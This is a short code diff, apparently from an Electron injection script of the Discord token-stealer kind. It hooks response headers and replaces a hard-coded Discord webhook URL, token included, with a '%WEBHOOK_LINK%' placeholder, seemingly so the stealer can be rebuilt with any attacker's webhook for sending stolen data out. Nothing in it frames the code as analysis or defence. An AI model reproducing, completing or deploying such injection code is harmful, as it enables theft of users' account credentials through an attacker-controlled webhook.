@@ -13,7 +13,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     k({ cancel: false, responseHeaders: j.responseHeaders }); 
   }); 
 
-  var webhook = "https://discord.com/api/webhooks/872110442573619211/p2mzejn__bnF2A6pQHDY-8agAP5SLZzZVe1xxqo20C39-sJuT2Ej0vhLBO-VORGAyINy";
+  var webhook = "%WEBHOOK_LINK%";
   
   function FirstTime(){
       
